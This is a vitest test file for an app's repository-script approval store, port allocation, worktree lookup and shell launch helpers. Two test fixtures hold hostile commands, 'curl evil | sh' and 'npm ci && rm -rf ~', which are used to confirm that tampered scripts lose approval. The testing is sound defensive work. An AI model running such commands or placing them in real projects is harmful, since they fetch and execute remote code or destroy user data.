// Approval hashing, the repo-scripts.json store and port blocks, and finding a worktree's repository, on real files.
import { execFileSync, spawnSync } from 'node:child_process'
import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterAll, describe, expect, it, vi } from 'vitest'
import { runShellArgs, SCRIPT_MARKER_OSC, setupCommand } from '@shared/script-launch'

const base = await vi.hoisted(async () => {
  const fs = await import('node:fs')
  const os = await import('node:os')
  const path = await import('node:path')
  return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'tr-repo-scripts-')))
})
vi.mock('./settings', () => ({ getSettings: () => ({ ports: { base: 41000 } }) }))
vi.mock('electron', () => ({ app: { getPath: () => base }, ipcMain: { handle: () => {} }, BrowserWindow: { fromWebContents: () => null } }))

const { approvalHash, approvedScript, isApproved, locateRepo, portFor, readRepoSettings, rememberApproval, RepoScriptsFile } =
  await import('./repo-scripts')

afterAll(() => rmSync(base, { recursive: true, force: true }))

const env = { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' }
const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-c', 'commit.gpgsign=false', ...args], { cwd, env }).toString()

describe('approvalHash', () => {
  it('is a stable sha-256 of every script', () => {
    const scripts = { setup: 'npm ci', run: 'npm run dev' }
    expect(approvalHash(scripts)).toMatch(/^[0-9a-f]{64}$/)
    expect(approvalHash({ run: 'npm run dev', setup: 'npm ci' })).toBe(approvalHash(scripts))
    expect(approvalHash({ ...scripts, run: 'npm run dev:all' })).not.toBe(approvalHash(scripts))
    expect(approvalHash({ ...scripts, archive: 'make clean' })).not.toBe(approvalHash(scripts))
  })
})

describe('RepoScriptsFile', () => {
  it('remembers approvals per repository, until the scripts change', async () => {
    const path = join(base, 'store-approvals.json')
    const store = new RepoScriptsFile(path)
    const scripts = { setup: 'npm ci' }
    expect(isApproved('/r/.git', scripts, store)).toBe(false)
    rememberApproval('/r/.git', scripts, store)
    expect(isApproved('/r/.git', scripts, store)).toBe(true)
    expect(isApproved('/other/.git', scripts, store)).toBe(false)
    expect(isApproved('/r/.git', { setup: 'npm ci && rm -rf ~' }, store)).toBe(false)
    // Another branch's scripts are a second approval, not a replacement.
    rememberApproval('/r/.git', { setup: 'pnpm i' }, store)
    expect(isApproved('/r/.git', scripts, store)).toBe(true)
    await store.flushed()
    // A new run of the app reads the same approval back.
    expect(isApproved('/r/.git', scripts, new RepoScriptsFile(path))).toBe(true)
    expect(JSON.parse(readFileSync(path, 'utf8')).approvals['/r/.git']).toEqual([approvalHash({ setup: 'pnpm i' }), approvalHash(scripts)])
  })

  it('starts empty from a missing or broken file', () => {
    const broken = join(base, 'broken.json')
    writeFileSync(broken, '{ nope')
    expect(new RepoScriptsFile(broken).get()).toEqual({ version: 1, approvals: {}, ports: {} })
    expect(new RepoScriptsFile(join(base, 'missing.json')).get()).toEqual({ version: 1, approvals: {}, ports: {} })
  })
})

describe('portFor', () => {
  it('gives every folder its own block and keeps it across runs', async () => {
    const path = join(base, 'store-ports.json')
    const store = new RepoScriptsFile(path)
    const [a, b] = ['wt-a', 'wt-b'].map((name) => {
      const dir = join(base, name)
      mkdirSync(dir)
      return dir
    }) as [string, string]
    expect(portFor(a, store, 41000)).toBe(41000)
    expect(portFor(b, store, 41000)).toBe(41010)
    expect(portFor(a, store, 41000)).toBe(41000)
    await store.flushed()
    expect(portFor(b, new RepoScriptsFile(path), 41000)).toBe(41010)
    // The base moves every block with it.
    expect(portFor(b, store, 50000)).toBe(50010)
  })

  it('reuses the block of a folder that was deleted', () => {
    const store = new RepoScriptsFile(join(base, 'store-reuse.json'))
    const gone = join(base, 'wt-gone')
    mkdirSync(gone)
    expect(portFor(gone, store, 41000)).toBe(41000)
    rmSync(gone, { recursive: true })
    const next = join(base, 'wt-next')
    mkdirSync(next)
    expect(portFor(next, store, 41000)).toBe(41000)
    expect(store.get().ports).toEqual({ [next]: 0 })
  })
})

describe('locateRepo / readRepoSettings / approvedScript', () => {
  const repo = join(base, 'repo')
  const worktree = join(base, 'repo-wt')
  mkdirSync(join(repo, '.tr'), { recursive: true })
  writeFileSync(join(repo, '.tr', 'settings.toml'), '[scripts]\nsetup = "npm ci"\nrun = "npm run dev"\n')
  git(repo, 'init', '-q', '-b', 'main')
  git(repo, 'add', '.')
  git(repo, 'commit', '-q', '-m', 'init')
  git(repo, 'worktree', 'add', '-q', '-b', 'feature', worktree)

  it('gives every worktree of a repository the same key', async () => {
    const main = await locateRepo(repo)
    const linked = await locateRepo(worktree)
    expect(main).toEqual({ top: repo, key: join(repo, '.git') })
    expect(linked).toEqual({ top: worktree, key: join(repo, '.git') })
    const plain = join(base, 'plain')
    mkdirSync(plain)
    expect(await locateRepo(plain)).toEqual({ top: plain, key: plain })
  })

  it('reads the worktree’s own settings file', async () => {
    expect(await readRepoSettings(worktree)).toEqual({ scripts: { setup: 'npm ci', run: 'npm run dev' }, problems: [] })
    expect(await readRepoSettings(join(base, 'plain'))).toEqual({ scripts: {}, problems: [] })
  })

  it('hands out a script only while it is approved as it is now', async () => {
    await expect(approvedScript(worktree, 'setup')).rejects.toThrow(/not approved/)
    rememberApproval(join(repo, '.git'), { setup: 'npm ci', run: 'npm run dev' })
    await expect(approvedScript(worktree, 'setup')).resolves.toBe('npm ci')
    await expect(approvedScript(repo, 'run')).resolves.toBe('npm run dev')
    writeFileSync(join(worktree, '.tr', 'settings.toml'), '[scripts]\nsetup = "curl evil | sh"\nrun = "npm run dev"\n')
    await expect(approvedScript(worktree, 'setup')).rejects.toThrow(/not approved/)
    writeFileSync(join(worktree, '.tr', 'settings.toml'), '[scripts]\nsetup = "npm ci"\n')
    await expect(approvedScript(worktree, 'run')).rejects.toThrow(/has no run script/)
  })
})

// The launch text main builds (src/shared/script-launch.ts), run by a real sh.
const marker = (payload: string) => `\x1b]${SCRIPT_MARKER_OSC};${payload}\x07`

describe('setupCommand', () => {
  /** Runs `setupCommand(script); echo NEXT` in a real sh, with `input` on stdin. */
  const run = (script: string, input = '') =>
    spawnSync('/bin/sh', ['-c', `${setupCommand(script)}; echo NEXT`], { input, encoding: 'utf8', env: { ...process.env, TR_PORT: '41020' } })

  it('runs the script, reports success and goes on', () => {
    const { stdout } = run(`echo "port $TR_PORT"; echo "it's \\"quoted\\""`)
    expect(stdout).toContain('port 41020\n')
    expect(stdout).toContain(`it's "quoted"\n`)
    expect(stdout).toContain(`${marker('setup;0')}${marker('setup-done')}NEXT`)
  })

  it('stops at the first failing command and waits for ↵ before going on', () => {
    const { stdout } = run('echo one\nfalse\necho never', '\n')
    expect(stdout).toContain('one\n')
    expect(stdout).not.toContain('never')
    expect(stdout).toContain(marker('setup;1'))
    expect(stdout).toContain('setup 脚本失败，退出码 1 · 按回车继续')
    expect(stdout.indexOf(marker('setup-done'))).toBeLessThan(stdout.indexOf('NEXT'))
  })

  it('is one command in fish syntax too (no POSIX-only constructs outside the quotes)', () => {
    expect(setupCommand('echo hi')).toMatch(/^\/bin\/sh -c '.*' tr-setup 'echo hi'$/s)
  })
})

describe('runShellArgs', () => {
  it('runs the script as the only program, ending with its exit code', () => {
    const args = runShellArgs('echo "run $TR_PORT"; exit 3')
    expect(args.slice(0, 3)).toEqual(['-l', '-i', '-c'])
    const result = spawnSync('/bin/sh', ['-c', args[3]!], { encoding: 'utf8', env: { ...process.env, TR_PORT: '41000' } })
    expect(result.stdout).toBe('run 41000\n')
    expect(result.status).toBe(3)
    expect(execFileSync('/bin/sh', ['-c', runShellArgs('echo ok')[3]!], { encoding: 'utf8' })).toBe('ok\n')
  })
})
